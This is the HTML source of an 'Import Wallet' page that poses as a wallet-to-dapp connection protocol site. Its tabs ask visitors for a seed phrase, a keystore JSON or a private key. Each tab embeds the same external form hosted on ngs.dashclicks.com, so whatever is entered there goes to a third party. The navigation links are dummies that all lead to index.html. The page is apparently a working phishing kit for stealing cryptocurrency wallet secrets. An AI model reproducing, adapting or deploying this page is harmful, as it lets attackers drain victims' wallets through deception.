<!DOCTYPE html>
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="stylesheet" href="assets/main.css" type="text/css"> 
<meta name="description" content="Open protocol for connecting Wallets to Dapps">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:image" content="assets/logo.svg">
<link rel="icon" href="assets/logo.svg">
<script>
    function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;
  
    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }
  
    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
  
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }
  </script>
<title>Import Wallet</title>
<style>
        * {
            box-sizing: border-box;
        }
      div {
            padding: 10px;
            background-color: #f6f6f6;
            overflow: hidden;
        }
      input[type=text], textarea, select {
            font: 17px Calibri;
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        input[type=button]{ 
            font: 17px Calibri;
            width: auto;
            float: right;
            cursor: pointer;
            padding: 7px;
        }
    </style>
</head>
<body>
    
<center>
<div class="top">
        <a href="index.html" class="left">Github</a>
        <a href="index.html" class="left">Docs</a>
        <a href="index.html" class="main"><img src="assets\logo.svg" alt="logo"></a>
        <a href="index.html" class="left">Wallets</a>
        <a href="#?v" class="left">Apps</a>
</div>
<br>
<h2><center>Connect wallet</center></h2>
<br>


<div class="tab">
  <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase1&#39;)">Phrase</button>
  <button class="tablinks" onclick="openCity(event, &#39;keystore1&#39;)">Keystore JSON</button>
  <button class="tablinks" onclick="openCity(event, &#39;private1&#39;)">Private Key</button>
</div>

<div id="phrase1" class="tabcontent" style="display: block;">
    <form action="" method="POST">
    <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />

  </div>

  <div id="keystore1" class="tabcontent" style="display: none;">

  <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />

  </div>

<div id="private1" class="tabcontent" style="display: none;">
    
        <!-- <input type="hidden" name="privatekey" value="MEW wallet"> -->
        <div class="field">
        <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />

    </form>
</div>

<footer>
</footer>
</center>
</body>
</html>